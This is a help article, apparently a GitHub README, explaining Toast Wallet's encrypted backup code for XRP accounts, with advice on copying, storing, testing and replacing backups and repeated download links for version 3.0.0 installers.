<p align="center"><img src="https://github.com/Toast-Wallet/learn/raw/HEAD/assets/banner-article.png" alt="Toast Wallet banner" width="100%"></p>

<h1 align="center">Toast Wallet backup code explained</h1>

<p align="center">Why the encrypted backup code is the real key to restoring.</p>

<p align="center">
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
</p>

| Platform | File |
|:--|:--|
| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |

All versions and checksums are on the [Toast Wallet 3.0.0 release page](https://github.com/Toast-Wallet/core/releases/tag/3.0.0).

> [!IMPORTANT]
> Only download from this GitHub release page.

---

## 💡 Short answer

The Toast Wallet backup code is an encrypted copy of your whole wallet. It is the one piece you must never lose. Paired with your passphrase or six recovery words, it restores your accounts in the [latest desktop wallet](https://github.com/Toast-Wallet/core/releases/tag/3.0.0) on any computer.

## 👀 You'll see this if

- You see a long, random-looking code in your notes and wonder what it is.
- You are not sure whether you still need it now that you have your passphrase.
- You want to know how often to make a new one.
- You are planning to replace your computer.

## 🤔 Why it matters

Your Toast Wallet data lives on your computer. Computers break, are stolen, are reset and are replaced. The backup code is how your wallet survives those events. When you choose Backup Wallet in Settings, Toast Wallet packs your accounts and keys into one encrypted string. That string is useless to anyone without the passphrase or the six words, which is what makes it safe to write down.

Because the code is encrypted, it is also a snapshot. It contains what your wallet held at the moment you made it. Accounts added later are not inside it, and it opens only with the passphrase or words that were active at that time. Making a new backup after each change keeps the snapshot current.

## 🧭 Before you start

Have paper ready and a clear, quiet moment. You will copy a long string of characters, and accuracy matters more than speed. Decide in advance where the finished backup will be kept and where a second copy will go.

## 🛠️ Fix: handle your backup code well

1. **Make a backup now.** Open Toast Wallet, unlock it, open Settings and choose Backup Wallet. The detailed walk-through is in [create a new Toast Wallet backup](https://github.com/Toast-Wallet/learn/blob/main/how-to/create-new-toast-wallet-backup.md).
2. **Copy it exactly.** Write the code on paper in clear characters. Group it into blocks of four or five characters to make checking easier.
3. **Check it twice.** Compare your paper copy with the screen character by character.
4. **Label it.** Write the date and which accounts it covers. Write where the matching passphrase or six words are stored, without writing them on the same visible line if the sheet could be seen by others.
5. **Store it safely.** Keep it somewhere private and dry. Make a second copy for a different location.
6. **Test it.** When convenient, practise a restore on a spare computer or after reinstalling, following [restore a Toast Wallet backup](https://github.com/Toast-Wallet/learn/blob/main/how-to/restore-toast-wallet-backup.md).
7. **Replace it after changes.** New account? Changed passphrase? Make a new backup and mark the old one as replaced.

## 🔁 If that did not work

- **The code is rejected during restore.** Look for misread characters, missing characters at line breaks or extra spaces. Re-type it slowly.
- **The code opens but accounts are missing.** The backup is older than those accounts. Look for a newer backup or check old computers. See [Toast Wallet missing addresses after restore](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-missing-addresses-after-restore.md).
- **You have no backup code at all.** If the wallet still opens on a computer, make one immediately. If it does not, read [open old Toast Wallet files](https://github.com/Toast-Wallet/learn/blob/main/how-to/open-old-toast-wallet-files.md).

## 🛡️ Prevention

Treat the backup code as important as the money itself. Never store it in email, chat, cloud documents or photos. Never enter it into a website; restoring happens only inside the desktop app. Keep it with the means to open it, the passphrase or the [six recovery words](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-recovery-phrase-explained.md), so whoever needs to restore your wallet has everything in one place. If you keep the wallet for family, make sure a trusted person knows where your backup is kept.

## 📝 Good to know

Because the backup code is encrypted, some people wonder whether it is safe to store digitally after all. The safer answer is still paper. Encryption protects the code only as long as the passphrase and six words remain private, and digital copies tend to spread: into cloud sync, old phones, email archives and backups you forget about. A sheet of paper in a known place is easier to control and cannot be copied silently by malware.

When you make a new backup, do not destroy the old one immediately. Label it "replaced" with the date, and keep it until you have confirmed that the new one restores correctly. Only then retire the old sheet in a way that keeps it private.

## 🔍 A closer look at what is inside

People sometimes wonder whether the backup code contains their XRP. It does not. It contains the keys that control your accounts, encrypted so that only your passphrase or six words can open them. Your XRP remains on the XRP Ledger the whole time. That is why the backup code can be restored on any computer with the latest desktop wallet: it simply hands the keys to the new installation, which then reads your balances from the ledger.

It also explains why one backup can cover several accounts. Every account you had when you pressed Backup Wallet is packed into the same code. Add an account later and the old code no longer tells the whole story, which is the reason for making a new backup after every change.

## ❓ FAQ

<details>
<summary>Is the backup code enough on its own?</summary>

No. It needs the passphrase or the six recovery words from the time it was made.

</details>

<details>
<summary>Can someone steal my XRP with only the backup code?</summary>

Not without the passphrase or words. Still, keep it private; never share any part of it.

</details>

<details>
<summary>How long is the backup code?</summary>

It is a long encrypted string. Copy every character exactly, without adding spaces.

</details>

> [!WARNING]
> No real support service will ever ask for your backup code. Anyone who does is trying to steal your XRP.

---

## ⬇️ Download Toast Wallet 3.0.0

<p align="center">
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
</p>

| Platform | File |
|:--|:--|
| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |

Checksums for every file are on the [official Toast Wallet 3.0.0 release](https://github.com/Toast-Wallet/core/releases/tag/3.0.0). More guides live in the [Toast Wallet learn hub](https://github.com/Toast-Wallet/learn).

---

## 📚 Related articles

| Guide | What it covers |
|:--|:--|
| [Create a new Toast Wallet backup](https://github.com/Toast-Wallet/learn/blob/main/how-to/create-new-toast-wallet-backup.md) | Make a fresh backup code after any change to your accounts. |
| [Restore a Toast Wallet backup](https://github.com/Toast-Wallet/learn/blob/main/how-to/restore-toast-wallet-backup.md) | Bring your accounts back with the backup code and passphrase or words. |
| [Toast Wallet recovery phrase explained](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-recovery-phrase-explained.md) | What the six recovery words do, and what they cannot do. |
